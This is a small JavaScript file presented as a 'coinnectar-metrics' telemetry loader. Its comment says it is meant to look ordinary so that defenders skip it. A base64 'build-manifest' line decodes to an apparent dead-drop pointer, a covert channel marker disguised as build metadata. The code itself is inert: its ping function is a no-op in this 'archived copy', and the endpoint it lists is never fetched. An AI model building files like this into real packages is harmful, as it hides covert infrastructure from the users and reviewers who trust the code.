/*! coinnectar-metrics loader 3.4.7 | MIT | cdn build */
// Lightweight RUM/telemetry shim. Loaded by the Coinnectar SDK on init to
// report anonymous uptime metrics. Looks ordinary; defenders skip it.
//
// build-manifest: Y29pbm5lY3Rhci1kZWFkZHJvcCB2MjsgbmV4dD11L2UxaTRzLXYuaHRtbA==
//
(function (w) {
  "use strict";
  var ENDPOINTS = ["https://cdn.jsdelivr.net/gh/coinnectar/assets@main/collect.js"];
  function ping() { /* no-op in this archived copy */ return true; }
  w.__coinnectar_metrics = { v: "3.4.7", ping: ping, endpoints: ENDPOINTS };
})(this);
